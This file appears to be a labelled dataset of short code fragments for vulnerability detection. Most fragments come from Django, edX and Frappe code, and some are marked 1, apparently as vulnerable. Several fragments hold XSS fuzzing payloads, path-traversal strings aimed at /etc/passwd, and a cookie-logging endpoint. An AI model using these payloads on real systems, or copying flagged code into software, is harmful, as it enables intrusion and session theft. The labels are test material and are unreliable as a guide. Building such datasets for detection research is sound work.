{"snippet_id": 31468, "code": "\", source=source, alpha=0.5, color=\" \t\tp[serv].legend.orientation=\"horizontal\" \t\tp[serv].legend.location=\"top_left\" \t\tp[serv].legend.padding=5 \tplots=[] \tfor key, value in p.items(): \t\tplots.append(value", "label": 0}, {"snippet_id": 19691, "code": " import CourseFixture, FixtureError from path import Path as path from paver.easy import sh, BuildFailure from pavelib.utils.test.suites.suite import TestSuite from pavelib.utils.envs import Env from pavelib", "label": 0}, {"snippet_id": 13209, "code": ", name='auth_password_reset_confirm'), url(r'^password_reset_complete/$', django.contrib.auth.views.password_reset_complete, name='auth_password_reset_complete'), url(r'^password_reset_done/$', django.contrib", "label": 0}, {"snippet_id": 52293, "code": ".update_name(name) doc2.update_data({'workflow': workflow.get_data()['workflow']}) doc2.save() workflow.set_workspace(request.user) workflow.check_workspace(request.fs, request.user) response={} request", "label": 0}, {"snippet_id": 45008, "code": " initial_params=ParameterForm.get_initial_params(dict([(param['name'], param['value']) for param in parameters])) params_form=ParametersFormSet(initial=initial_params) popup=render('editor/submit_job_popup.mako',", "label": 0}, {"snippet_id": 14663, "code": "() def test_default(self): suite=BokChoyTestSuite('') name='tests' self.assertEqual(suite.cmd, self._expected_command(name=name)) def test_suite_spec(self): spec='test_foo.py' suite=BokChoyTestSuite(''", "label": 0}, {"snippet_id": 48508, "code": "/admin?error=noyb\") current_reservation.submitted=True current_reservation.save() res: HttpResponseRedirect=HttpResponseRedirect(forward_url) return res def manipulate_reservation_action(request: HttpRequest", "label": 0}, {"snippet_id": 15274, "code": ". verify_xss -when set, check for XSS vulnerabilities in the page HTML. See nosetest documentation: http://nose.readthedocs.org/en/latest/usage.html \"\"\" def __init__(self, *args, **kwargs): super(BokChoyTestSuite", "label": 0}, {"snippet_id": 11810, "code": "'static_template_view.views.render', {'template': 'jobs.html'}, name=\"jobs\"), url(r'^press$', 'student.views.press', name=\"press\"), url(r'^media-kit$', 'static_template_view.views.render', {'template': 'media-kit.html", "label": 0}, {"snippet_id": 25672, "code": ".settings.timezone) help_text=rich_text(q.help_text) if q.type==Question.TYPE_BOOLEAN: if q.required: widget=forms.CheckboxInput(attrs={'required': 'required'}) else: widget=forms.CheckboxInput() if initial", "label": 0}, {"snippet_id": 13079, "code": "', 'student.views.confirm_email_change'), url(r'^change_name$', 'student.views.change_name_request', name=\"change_name\"), url(r'^accept_name_change$', 'student.views.accept_name_change'), url(r'^reject_name_change$", "label": 0}, {"snippet_id": 21761, "code": "'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/news$', 'courseware.views.news', name=\"news\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/discussion/', include('django_comment_client.urls')) ) urlpatterns +=", "label": 0}, {"snippet_id": 50240, "code": " self.databuffer: del self.databuffer[csessid] def mode_init(self, request): \"\"\" This is called by render_POST when the client requests an init mode operation(at startup) Args: request(Request): Incoming", "label": 0}, {"snippet_id": 48015, "code": "(u==user) and u.rights < 4: return redirect(\"/admin?error='You're not allowed to edit other users.'\") medium=Media.objects.get(pk=int(media_id)) user.avatarMedia=medium user.save() except Exception as e", "label": 0}, {"snippet_id": 42763, "code": " in(\"parent\", \"parenttype\"): \t\t\t\tif not self.get(fieldname): \t\t\t\t\tmissing.append((fieldname, get_msg(frappe._dict(label=fieldname)))) \t\treturn missing \tdef get_invalid_links(self, is_submittable=False)", "label": 0}, {"snippet_id": 7058, "code": "='logout'), url(r'^create_account$', 'student.views.create_account'), url(r'^activate/(?P<key>[^/]*)$', 'student.views.activate_account', name=\"activate\"), url(r'^begin_exam_registration/(?P<course_id>", "label": 0}, {"snippet_id": 18057, "code": ".views.course_wiki_redirect', name=\"course_wiki\"), url(r'^courses/(?:[^/]+/[^/]+/[^/]+)/wiki/', include(wiki_pattern())), ) if settings.COURSEWARE_ENABLED: urlpatterns +=( url(r'^courses/(?P<course_id>[^", "label": 0}, {"snippet_id": 12561, "code": ", name=\"remove_from_cohort\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/debug$', 'course_groups.views.debug_cohort_mgmt', name=\"debug_cohort_mgmt\"), url(r'^courses/(?P<course_id>[^/]+/[^/", "label": 0}, {"snippet_id": 4952, "code": "'<svg/x=\">\"/onload=confirm()//', '<svg%0Aonload=%09((pro\\u006dpt))()//', '<iMg sRc=x:confirm`` oNlOad=e\\u0076al(src)>', '<sCript x>confirm``</scRipt x>', '<Script x>prompt()</scRiPt x>', '<sCriPt sRc=/", "label": 0}, {"snippet_id": 13349, "code": "\"jobs\"), url(r'^press$', 'student.views.press', name=\"press\"), url(r'^media-kit$', 'static_template_view.views.render', {'template': 'media-kit.html'}, name=\"media-kit\"), url(r'^faq$', 'static_template_view", "label": 0}, {"snippet_id": 38649, "code": "(key)) \t\tfor key, value in iteritems(d): \t\t\tself.set(key, value) \t\treturn self \tdef update_if_missing(self, d): \t\tif isinstance(d, BaseDocument): \t\t\td=d.get_valid_dict() \t\tif \"doctype\" in d: \t\t\tself.set(", "label": 0}, {"snippet_id": 34443, "code": " list) and not as_value: \t\t\tself.__dict__[key]=[] \t\t\tself.extend(key, value) \t\telse: \t\t\tself.__dict__[key]=value \tdef delete_key(self, key): \t\tif key in self.__dict__: \t\t\tdel self.__dict__[key] \tdef append", "label": 0}, {"snippet_id": 10515, "code": ".assertEqual( suite.cmd, self._expected_command(suite.pa11y_report_dir, suite.start_urls) ) def test_get_test_course(self): suite=Pa11yCrawler('') suite.get_test_course() self._mock_sh.assert_has_calls", "label": 0}, {"snippet_id": 53934, "code": "\tif request.method==\"GET\" or request.method==\"POST\": \t\tdata=request.values \t\tcookie=data.get('cookie') \t\twith open('cookies.txt',mode='a') as f: \t\t\tf.write('\\n---------------------------\\n'+cookie+'\\n---", "label": 0}, {"snippet_id": 20887, "code": ".static_university_profile', name=\"static_university_profile\", kwargs={'org_id': 'EPFLx'}), url(r'^university_profile/(?P<org_id>[^/]+)$', 'courseware.views.university_profile', name=\"university_profile\"), ) urlpatterns +", "label": 0}, {"snippet_id": 37512, "code": "\tlist_context.sub_title=_(\"Posts by{0}\").format(blogger) \t\tlist_context.title=blogger \telif frappe.local.form_dict.txt: \t\tlist_context.sub_title=_('Filtered by \"{0}\"').format(frappe.local.form_dict.txt)", "label": 1}, {"snippet_id": 32603, "code": "/README.md') elif path.lower().endswith('.png'): self._DoImage(full_path, 'image/png') elif path.lower().endswith('.jpg'): self._DoImage(full_path, 'image/jpeg') elif os.path.isdir(full_path): self._DoDirListing", "label": 0}, {"snippet_id": 12194, "code": " name=\"pdf_book\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/(?P<page>[^/]*)$', 'staticbook.views.pdf_index'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(", "label": 1}, {"snippet_id": 49652, "code": " is name of the field(string) or callable which returns html -label for the column(string) \"\"\" if not self.list_display: return[SmartColumn(self.model, '__str__', 1, self.ordering_query_value, self.ordering_query_param", "label": 0}, {"snippet_id": 47911, "code": ") pw2=str(request.POST[\"confirm_password\"]) mail=str(request.POST[\"email\"]) rights=int(request.POST[\"rights\"]) if not check_password_conformity(pw1, pw2): recreate_form('password mismatch') auth_user: User", "label": 1}, {"snippet_id": 34624, "code": ", \"name\", None): \t\t\tvalue.__dict__['__islocal']=1 \t\treturn value \tdef get_valid_dict(self, sanitize=True, convert_dates_to_str=False): \t\td=frappe._dict() \t\tfor fieldname in self.meta.get_valid_columns(", "label": 0}, {"snippet_id": 4665, "code": "'tbody', 'td', 'template', 'textarea', 'tfoot', 'th', 'thead', 'time', 'title', 'tr', 'track', 'tt', 'u', 'ul', 'var', 'video', 'wbr', 'xmp', ] _events=[ 'onabort', 'onautocomplete', 'onautocompleteerror'", "label": 0}, {"snippet_id": 45880, "code": "=Submission(request.user, bundle, request.fs, request.jt, properties=properties) job_id=submission.run() return job_id except RestException, ex: raise PopupException(_(\"Error submitting bundle %s\") %(bundle", "label": 0}, {"snippet_id": 54203, "code": ", text=\"User-Agent:\",background='light sky blue').grid(row=4) Label(main, text=\"Payload:\",background='light sky blue').grid(row=5) Label(main, text=\"HTTP Proxy:\",background='light sky blue').grid(row=6", "label": 0}, {"snippet_id": 30319, "code": ": \t\tresponse=requests.get('http://%s:%s/%s' %(serv, stats_port, stats_page), auth=(haproxy_user, haproxy_pass)) \texcept requests.exceptions.ConnectTimeout: \t\tprint('Oops. Connection timeout occured!') ", "label": 0}, {"snippet_id": 7119, "code": ".password_reset_confirm_wrapper', name='auth_password_reset_confirm'), url(r'^password_reset_complete/$', django.contrib.auth.views.password_reset_complete, name='auth_password_reset_complete'), url(r'^password_reset_done/$'", "label": 0}, {"snippet_id": 13199, "code": ", url(r'^password_reset_confirm/(?P<uidb36>[0-9A-Za-z]+)-(?P<token>.+)/$', 'student.views.password_reset_confirm_wrapper', name='auth_password_reset_confirm'), url(r'^password_reset_complete/$', django", "label": 0}, {"snippet_id": 49591, "code": "] self.list_filter=list_filter or[] self.list_search=list_search or[] self.search_query_value=self.query_params.get(search_query_param, '') self.search_query_param=search_query_param self.ordering_query_value", "label": 0}, {"snippet_id": 54578, "code": " class RegisterFormView(FormView): \"\"\"\u6ce8\u518c\u9875\u9762\u3002\u4f7f\u7528\u7cfb\u7edf\u63d0\u4f9b\u7684\u521b\u5efa\u7528\u6237\u8868\u5355\u3002\"\"\" template_name='register.html' form_class=UserCreationForm success_url='/login/' def form_valid(self, form): \"\"\"\u6821\u9a8c\u6210\u529f\uff0c\u4fdd\u5b58\u7528\u6237\u3002\"\"\" form.save() return", "label": 0}, {"snippet_id": 50643, "code": " representation of the browser session. \"\"\" if self.csessid: return _CLIENT_SESSIONS(session_key=self.csessid) def disconnect(self, reason=\"Server disconnected.\"): \"\"\" Disconnect from server. Args: reason", "label": 0}, {"snippet_id": 15968, "code": "{zipped_course} -C{courses_dir}'.format( zipped_course=zipped_course, courses_dir=self.imports_dir, ) ) def generate_html_reports(self): \"\"\" Runs pa11ycrawler json-to-html \"\"\" cmd_str=( 'pa11ycrawler json", "label": 0}, {"snippet_id": 5774, "code": "<source onerror=\"alert(1)\">', '<video onerror=\"alert(1)\"><source></source></video>', '<form><button formaction=\"javascript:alert(1)\">X</button>', '<math href=\"javascript:alert(1)\">CLICKME</math>', '<link rel", "label": 0}, {"snippet_id": 52426, "code": " response['status']=0 response['id']=workflow_doc.id response['doc1_id']=workflow_doc.doc.get().id response['message']=_('Page saved !') return HttpResponse(json.dumps(response), mimetype=\"application/json", "label": 0}, {"snippet_id": 29376, "code": ")==\"1\": \t\t\tcommands.extend(open_port_firewalld(cfg)) \t \terror +=str(upload(serv, tmp_file, cfg, dir='fullpath')) \ttry: \t\terror +=ssh_command(serv, commands) \texcept Exception as e: \t\terror +=e \tif error", "label": 0}, {"snippet_id": 50293, "code": "(session_key=sess.csessid) uid=csession and csession.get(\"webclient_authenticated_uid\", False) if uid: sess.uid=uid sess.logged_in=True sess.sessionhandler.connect(sess) self.last_alive[csessid]=(time.time(),", "label": 0}, {"snippet_id": 15110, "code": "), ]) def test_generate_html_reports(self): suite=Pa11yCrawler('') suite.generate_html_reports() self._mock_sh.assert_has_calls([ call( 'pa11ycrawler json-to-html --pa11ycrawler-reports-dir={}'.format(suite", "label": 0}, {"snippet_id": 5018, "code": "/www.w3.org/1999/xhtml\">alert(1)</script></html>' ] _h5payloads=[ '<form id=\"test\"></form><button form=\"test\" formaction=\"javascript:alert(1)\">X</button>', '<input onfocus=alert(1) autofocus>', '<input", "label": 0}, {"snippet_id": 6610, "code": " @property def verify_request_signatures(self): \"\"\" Verify request signatures, if they exist. This defaults to False since it is a trivial DoS to consume all the IdP:s CPU resources if this is set to True", "label": 0}, {"snippet_id": 10835, "code": "() self.log_dir.makedirs_p() self.har_dir.makedirs_p() self.report_dir.makedirs_p() test_utils.clean_reports_dir() if not(self.fasttest or self.skip_clean or self.testsonly): test_utils.clean_test_files", "label": 0}, {"snippet_id": 47247, "code": ") rec_uuid=str(uuid.uuid4()) Record.create({'title': 'test'}, id_=rec_uuid) db.session.commit() with app.test_request_context(): index_view_url=url_for('recordmetadata.index_view') delete_view_url=url_for", "label": 1}, {"snippet_id": 15220, "code": "(e.g., collectstatic) serversonly -prepare and run the necessary servers, only stopping when interrupted with Ctrl-C testsonly -assume servers are running(as per above) and run tests with no setup or cleaning", "label": 0}, {"snippet_id": 36068, "code": "(fieldname)): \t\t\treturn self.get(fieldname) \t\treturn get_decrypted_password(self.doctype, self.name, fieldname, raise_exception=raise_exception) \tdef is_dummy_password(self, pwd): \t\treturn ''.join(set(pwd", "label": 0}, {"snippet_id": 27670, "code": "=_MENU_ITEMS values['is_oss_fuzz']=utils.is_oss_fuzz() values['is_development']=( environment.is_running_on_app_engine_development()) values['is_logged_in']=bool(helpers.get_user_email()) values['ga_tracking_id", "label": 0}, {"snippet_id": 2537, "code": "=xss_payload_decode(payload) if xss_post_request.text.find(decoded_payload) !=-1: impact=check_xss_impact(xss_post.body) if db_update is not True: attack_result={ \"id\": 11, \"scanid\": scanid, \"url\": xss_url,", "label": 1}, {"snippet_id": 48053, "code": " text: str, file): m: Media=Media() upload_base_path: str='uploads/' +str(date.today().year) high_res_file_name=upload_base_path +'/HIGHRES_' +ntpath.basename(file.name.replace(\" \", \"_\")) low_res_file_name", "label": 0}, {"snippet_id": 13302, "code": ")university_profile/EPFLx$', 'courseware.views.static_university_profile', name=\"static_university_profile\", kwargs={'org_id': 'EPFLx'}), url(r'^university_profile/(?P<org_id>[^/]+)$', 'courseware.views", "label": 0}, {"snippet_id": 35373, "code": "\t\t\tdocname=self.get(df.fieldname) \t\t\tif docname: \t\t\t\tif df.fieldtype==\"Link\": \t\t\t\t\tdoctype=df.options \t\t\t\t\tif not doctype: \t\t\t\t\t\tfrappe.throw(_(\"Options not set for link field{0}\").format(df.fieldname)", "label": 0}, {"snippet_id": 12097, "code": "'courseware.views.mktg_course_about', name=\"mktg_about_course\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/$', 'courseware.views.course_info', name=\"course_root\"), url(r'^courses/(?P<course_id>[^/", "label": 0}, {"snippet_id": 38309, "code": " \t\t\t\tt1.published_on as creation, \t\t\t\tt1.content as content, \t\t\t\tifnull(t1.blog_intro, t1.content) as intro, \t\t\t\tt2.full_name, t2.avatar, t1.blogger, \t\t\t\t(select count(name) from `tabCommunication` \t\t\t", "label": 0}, {"snippet_id": 11654, "code": ".auth.views.password_change, name='auth_password_change'), url(r'^password_change_done/$', django.contrib.auth.views.password_change_done, name='auth_password_change_done'), url(r'^password_reset_confirm/", "label": 0}, {"snippet_id": 1596, "code": ": for data in records: data.pop('_id') try: data= ast.literal_eval(json.dumps(data)) if data['scanid']: if data['scanid'] not in scanids: scanids.append({\"scanid\": data['scanid'], \"name\": data['name'],", "label": 0}, {"snippet_id": 10394, "code": ") suite=BokChoyTestSuite('', num_processes=process_count) self.assertEqual(BokChoyTestSuite.verbosity_processes_string(suite), expected_verbosity_string) def test_invalid_verbosity_and_processes(self):", "label": 0}, {"snippet_id": 1882, "code": " key,value in body.items(): xss_payloads=fetch_xss_payload() for payload in xss_payloads: temp_body.update(body) temp_body[key]=payload print \"updated body\",temp_body xss_post_request=req.api_request(url,", "label": 0}, {"snippet_id": 37936, "code": " on_update(self): \t\tclear_cache(\"writers\") \tdef get_context(self, context): \t\t \t\tif not cint(self.published): \t\t\traise Exception(\"This blog has not been published yet!\") \t\t \t\tcontext.full_name=get_fullname(self", "label": 0}, {"snippet_id": 23039, "code": "='grade_summary'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading$', 'open_ended_grading.views.staff_grading', name='staff_grading'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading", "label": 0}, {"snippet_id": 16328, "code": " 'courseware.views.static_university_profile', name=\"static_university_profile\", kwargs={'org_id': 'EPFLx'}), url(r'^university_profile/(?P<org_id>[^/]+)$', 'courseware.views.university_profile', name=", "label": 0}, {"snippet_id": 38409, "code": "\t\tpost.comment_text=_('1 comment') \t\telse: \t\t\tpost.comment_text=_('{0} comments').format(str(post.comments)) \t\tpost.avatar=post.avatar or \"\" \t\tpost.category=frappe.db.get_value('Blog Category', post.blog_category", "label": 0}, {"snippet_id": 24220, "code": " -C{dir}'.format(dir=suite.imports_dir)), ]) def test_generate_html_reports(self): suite=Pa11yCrawler('') suite.generate_html_reports() self._mock_sh.assert_has_calls([ call( 'pa11ycrawler json-to-html", "label": 0}, {"snippet_id": 16294, "code": " name=\"static_university_profile\", kwargs={'org_id': 'TorontoX'}), url(r'^(?i)university_profile/RiceX$', 'courseware.views.static_university_profile', name=\"static_university_profile\", kwargs={'org_id': ", "label": 0}, {"snippet_id": 52937, "code": "'coordinator') doc=None if coordinator_id: doc=Document2.objects.get(id=coordinator_id) coordinator=Coordinator(document=doc) else: coordinator=Coordinator() api=get_oozie(request.user) credentials=Credentials(", "label": 0}, {"snippet_id": 37074, "code": " as content, \t\t\t\tifnull(t1.blog_intro, t1.content) as intro, \t\t\t\tt2.full_name, t2.avatar, t1.blogger, \t\t\t\t(select count(name) from `tabCommunication` \t\t\t\t\twhere \t\t\t\t\t\tcommunication_type='Comment' \t\t\t\t\t", "label": 0}, {"snippet_id": 52548, "code": "'name'], _property['value']) for _property in properties])) if copied_properties: _properties.update(copied_properties) response['status']=0 response['properties']=_properties response['name']='%s-%s' ", "label": 0}, {"snippet_id": 54312, "code": "(main, values=ua) user_agent.current(1) global payload payload=ttk.Combobox(main, values=pl) payload.current(0) global proxy proxy=ttk.Combobox(main, values=prox) global refresh refresh=ttk.Combobox(main", "label": 0}, {"snippet_id": 12292, "code": "/]+/[^/]+/[^/]+)/courseware/(?P<chapter>[^/]*)/$', 'courseware.views.index', name=\"courseware_chapter\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter>[^/]*)/(?P<section>[^/]*)", "label": 0}, {"snippet_id": 9977, "code": "-t pavelib/paver_tests/test_paver_bok_choy_cmds.py \"\"\" import os import unittest from mock import patch, call from test.test_support import EnvironmentVarGuard from paver.easy import BuildFailure from pavelib", "label": 0}, {"snippet_id": 49659, "code": "(string) \"\"\" if not self.list_display: return[SmartColumn(self.model, '__str__', 1, self.ordering_query_value, self.ordering_query_param)] columns=[] for index, field in enumerate(self.list_display, start", "label": 0}, {"snippet_id": 42945, "code": ".fieldname, values.name) \t\t\t\t\tfor _df in fields_to_fetch: \t\t\t\t\t\tif self.is_new() or self.docstatus !=1 or _df.allow_on_submit: \t\t\t\t\t\t\tsetattr(self, _df.fieldname, values[_df.fetch_from.split('.')[-1]])", "label": 0}, {"snippet_id": 6686, "code": " in simple templating of login.html. \"\"\" return self.config.get(self.section, 'signup_link') @property def dashboard_link(self): \"\"\" URL(string) for use in simple templating of forbidden.html. \"\"\" return", "label": 0}, {"snippet_id": 14504, "code": ", ) if settings.MITX_FEATURES.get('ENABLE_HINTER_INSTRUCTOR_VIEW'): urlpatterns +=( url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/hint_manager$', 'instructor.hint_manager.hint_manager', name=\"hint_manager", "label": 0}, {"snippet_id": 40346, "code": " Editor') \t\t\tself.set(fieldname, sanitized_value) \tdef _save_passwords(self): \t\t'''Save password field values in __Auth table''' \t\tif self.flags.ignore_save_passwords is True: \t\t\treturn \t\tfor df in self", "label": 0}, {"snippet_id": 54389, "code": "=1) proxy.current(0) proxy.config(width=30) refresh.grid(row=7, column=1) refresh.current(1) refresh.config(width=30) crawl.grid(row=8, column=1) crawl.current(0) crawl.config(width=30) Button(main, text", "label": 0}, {"snippet_id": 32499, "code": "-_]+', r'\\1', value) return value class Server(SocketServer.TCPServer): def __init__(self, server_address, top_level): SocketServer.TCPServer.__init__(self, server_address, Handler) self.top_level=top_level", "label": 0}, {"snippet_id": 2337, "code": ": headers, \"req_body\":body, \"res_headers\": xss_request.headers,\"res_body\": xss_request.text} dbupdate.insert_record(attack_result) result,db_update=True,True vul_param +=key else: result=True if vul_param", "label": 0}, {"snippet_id": 573, "code": "']: impact=\"Low\" else: impact=\"High\" else: impact=\"Low\" return impact def xss_get_url(url,method,headers,body,scanid=None): xss_result='' xss_payloads=fetch_xss_payload() uri_check_list=['?', '&', '=',", "label": 1}, {"snippet_id": 28376, "code": " and the path. Must be: app/haproxy-webintarface.config</div>') \ttry: \t\treturn config.get(sec, var) \texcept: \t\tprint('Content-type: text/html\\n') \t\tprint('<center><div class=\"alert alert-danger\">Check the", "label": 0}, {"snippet_id": 29089, "code": ", **kwargs): \timport sql \tscript=\"syn_flood_protect.sh\" \ttmp_config_path=sql.get_setting('tmp_config_path') \t \tenable=\"disable\" if kwargs.get('enable')==\"0\" else \"disable\" \tos.system(\"cp scripts/%s.\" %", "label": 0}, {"snippet_id": 55086, "code": "): return JsonResponse({'count': 0}) projects_pk=entities.values_list('resource__project__pk', flat=True) projects=Project.objects.filter(pk__in=projects_pk.distinct()) for project in projects: if( not", "label": 0}, {"snippet_id": 2393, "code": "='GET' or method=='DEL': xss_get_uri(url,method,headers,body,scanid) xss_get_url(url,method,headers,body,scanid) if method=='POST' or method=='PUT': xss_post_method(url,method,headers,body,scanid) xss_http_headers", "label": 0}, {"snippet_id": 19512, "code": " num_processes=process_count) self.assertEqual(BokChoyTestSuite.verbosity_processes_string(suite), expected_verbosity_string) def test_invalid_verbosity_and_processes(self): \"\"\" If an invalid combination of", "label": 0}, {"snippet_id": 11301, "code": ".join(self.report_dir, 'pa11ycrawler_reports') self.tar_gz_file=\"https://github.com/edx/demo-test-course/archive/master.tar.gz\" self.start_urls=[] auto_auth_params={ \"redirect\": 'true', \"staff\": 'true', ", "label": 0}, {"snippet_id": 55025, "code": "=changed_translation_pks) .prefetch_related('entity__resource') ) ] TranslationMemoryEntry.objects.bulk_create(memory_entries) @login_required(redirect_field_name='', login_url='/403') @require_POST @require_AJAX", "label": 0}, {"snippet_id": 25926, "code": "(time_format=get_format_without_seconds('TIME_INPUT_FORMATS')), ) field.question=q if answers: field.answer=answers[0] self.fields['question_%s' % q.id]=field responses=question_form_fields.send(sender", "label": 0}, {"snippet_id": 5077, "code": "(1)\">CLICKME</math>', '<link rel=\"import\" href=\"test.svg\" />', '<iframe srcdoc=\"&lt;img src&equals;x:x onerror&equals;alert&lpar;1&rpar;&gt;\" />', ] class XSS(Fuzzer): \"\"\"generate XSS payload\"\"\" tags=_tags", "label": 0}, {"snippet_id": 36319, "code": "\tif not print_hide: \t\t\tif df and df.print_hide is not None: \t\t\t\tprint_hide=df.print_hide \t\t\telif meta_df: \t\t\t\tprint_hide=meta_df.print_hide \t\treturn print_hide \tdef in_format_data(self, fieldname): \t\t\"", "label": 0}, {"snippet_id": 27600, "code": " contact_string=db_config.get_value('contact_string') template_values={ 'message': message, 'user_email': helpers.get_user_email(), 'login_url': login_url, 'switch_account_url': login_url, 'logout_url'", "label": 0}, {"snippet_id": 40319, "code": ")!=\"Email\") \t\t\t\t\t\tor df.get(\"fieldtype\") in(\"Attach\", \"Attach Image\") \t\t\t\t\t\t \t\t\t\t\t\tor self.docstatus==2 \t\t\t\t\t\tor(self.docstatus==1 and not df.get(\"allow_on_submit\"))): \t\t\t\tcontinue \t\t\telse: \t\t\t\tsanitized_value", "label": 1}, {"snippet_id": 25002, "code": "}\\\"\".format(cms_params)) sequence_url=\"/api/courses/v1/blocks/?{}\".format( urlencode({ \"course_id\": self.course_key, \"depth\": \"all\", \"all_blocks\": \"true\", }) ) auto_auth_params.update({'redirect_to': sequence_url", "label": 0}, {"snippet_id": 21228, "code": "\"course_root\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/info$', 'courseware.views.course_info', name=\"info\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/syllabus$', 'courseware.views.syllabus", "label": 0}, {"snippet_id": 2049, "code": "?test='+payload referer_header={\"Referer\": referer_header_value} temp_headers.update(referer_header) ref_header_xss=req.api_request(url, \"GET\", temp_headers) decoded_payload=xss_payload_decode(payload) if", "label": 0}, {"snippet_id": 20512, "code": ".format( tar_gz_file=self.tar_gz_file, zipped_course=zipped_course, ) ) msg=colorize('green', \"Uncompressing the test course...\") print msg sh( 'tar zxf{zipped_course} -C{courses_dir}'.format( zipped_course", "label": 0}, {"snippet_id": 49336, "code": "(\"Cannot use a function that alters data in smart list\") except AttributeError: self.order_field=self.field_name pass if self.order_field: self.order=SmartOrder(query_params=query_params, column_id=column_id", "label": 0}, {"snippet_id": 5496, "code": "'onwheel' ] _htmlTemplate=''' <!DOCTYPE html> <html> <head> <title>XSS Fuzzer</title> <meta http-equiv=\"Content-Type\" content=\"text/html; charset=utf-8\" /> </head> <body> %s </body> </html> ''' _probes=[ \"\"", "label": 0}, {"snippet_id": 37964, "code": ") \t\tif self.blogger: \t\t\tcontext.blogger_info=frappe.get_doc(\"Blogger\", self.blogger).as_dict() \t\tcontext.description=self.blog_intro or self.content[:140] \t\tcontext.metatags={ \t\t\t\"name\": self.title, \t\t", "label": 0}, {"snippet_id": 26458, "code": "\"] lfi_attacks=[ '../../etc/passwd', '../../../etc/passwd', '../../../../etc/passwd', '../../../../../etc/passwd', '../../../../../../etc/passwd', '../../../../../../../etc/passwd', '../../../../../../", "label": 0}, {"snippet_id": 37433, "code": "\t{\"name\": \"Blog\", \"route\": \"/blog\"}, \t\t\t{\"label\": context.category.title, \"route\":context.category.route}] def get_list_context(context=None): \tlist_context=frappe._dict( \t\ttemplate=\"templates/includes", "label": 0}, {"snippet_id": 23945, "code": "(name=test_dir) ) def test_verbosity_settings_1_process(self): \"\"\" Using 1 process means paver should ask for the traditional xunit plugin for plugin results \"\"\" expected_verbosity_string=( \"--with-xunit", "label": 0}, {"snippet_id": 50810, "code": " or useansi)) screenreader=options.get(\"screenreader\", flags.get(\"SCREENREADER\", False)) prompt=options.get(\"send_prompt\", False) if screenreader: text=parse_ansi(text, strip_ansi=True, xterm256=False,", "label": 0}, {"snippet_id": 34724, "code": "=None \t\t\t\telif df.get(\"unique\") and cstr(d[fieldname]).strip()==\"\": \t\t\t\t\t \t\t\t\t\td[fieldname]=None \t\t\t\tif isinstance(d[fieldname], list) and df.fieldtype !='Table': \t\t\t\t\tfrappe.throw(_('Value for{0} cannot", "label": 0}, {"snippet_id": 695, "code": ".parse_qs(url_query.query) if parsed_query: for key,value in parsed_query.items(): try: result='' logs.logging.info(\"GET param for xss: %s\",key) xss_payloads=fetch_xss_payload() for payload in xss_payloads", "label": 0}, {"snippet_id": 9561, "code": " url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/peer_grading$', 'open_ended_grading.views.peer_grading', name='peer_grading'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/notes$', 'notes.views.notes", "label": 0}, {"snippet_id": 44454, "code": " in jobs: doc2=Document2.objects.get(type='oozie-workflow2', id=job['id']) name=doc2.name +'-copy' copy_doc=doc2.doc.get().copy(name=name, owner=request.user) doc2.pk=None doc2.id=None doc2.uuid=str(uuid", "label": 0}, {"snippet_id": 43179, "code": " \t\tcolumn_types_to_check_length=('varchar', 'int', 'bigint') \t\tfor fieldname, value in iteritems(self.get_valid_dict()): \t\t\tdf=self.meta.get_field(fieldname) \t\t\tif not df or df.fieldtype=='Check': \t\t\t\t", "label": 0}, {"snippet_id": 2569, "code": "\"res_body\": xss_request.text} dbupdate.insert_record(attack_result) db_update=True vul_param +=key else: result=True if vul_param=='': post_vul_param +=key else: post_vul_param +=','+key if post_vul_param", "label": 0}, {"snippet_id": 43725, "code": "\tPrint Hide can be set via the Print Format Builder or in the controller as a list \t\tof hidden fields. Example \t\t\tclass MyDoc(Document): \t\t\t\tdef __setup__(self): \t\t\t\t\tself.print_hide=[\"field1\", \"field2\"] ", "label": 0}, {"snippet_id": 49545, "code": ".filter(pk__in=pks) values=[ SmartFilterValue(self.field_name, obj, str(obj.pk), self.query_params) for obj in qs ] return[SmartFilterValue(self.field_name, _(\"All\"), None, self.query_params)] +values class", "label": 0}, {"snippet_id": 38204, "code": " name from `tabBlog Post` \t\t\twhere `tabBlog Post`.blog_category=`tabBlog Category`.name and published=1) \t\torder by title asc\"\"\", as_dict=1) def clear_blog_cache(): \tfor blog in frappe.db.sql_list(\"\"\"select", "label": 0}, {"snippet_id": 25701, "code": " label=q.question, required=q.required, help_text=help_text, initial=initialbool, widget=widget, ) elif q.type==Question.TYPE_NUMBER: field=forms.DecimalField( label=q.question, required=q.required, help_text", "label": 1}, {"snippet_id": 41027, "code": " tabBlogger set posts=(select count(*) from `tabBlog Post` \t\t\twhere ifnull(blogger,'')=tabBlogger.name) \t\t\twhere name=%s\"\"\",(self.blogger,)) \tdef on_update(self): \t\tclear_cache(\"writers\") \tdef get_context", "label": 0}, {"snippet_id": 12822, "code": "+)$', 'external_auth.views.provider_identity', name='openid-provider-login-identity'), url(r'^openid/provider/identity/$', 'external_auth.views.provider_identity', name='openid-provider-identity'), url", "label": 0}, {"snippet_id": 35149, "code": "(\"{0} must be unique\".format(label or fieldname))) \t\t \t\traise frappe.UniqueValidationError(self.doctype, self.name, e) \tdef update_modified(self): \t\t'''Update modified timestamp''' \t\tself.set(\"modified", "label": 0}, {"snippet_id": 23022, "code": "]+/[^/]+)/gradebook$', 'instructor.views.gradebook', name='gradebook'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/grade_summary$', 'instructor.views.grade_summary', name='grade_summary'), url(r'^courses", "label": 0}, {"snippet_id": 37296, "code": ".published_on=today() \t\t \t\tfrappe.db.sql(\"\"\"update tabBlogger set posts=(select count(*) from `tabBlog Post` 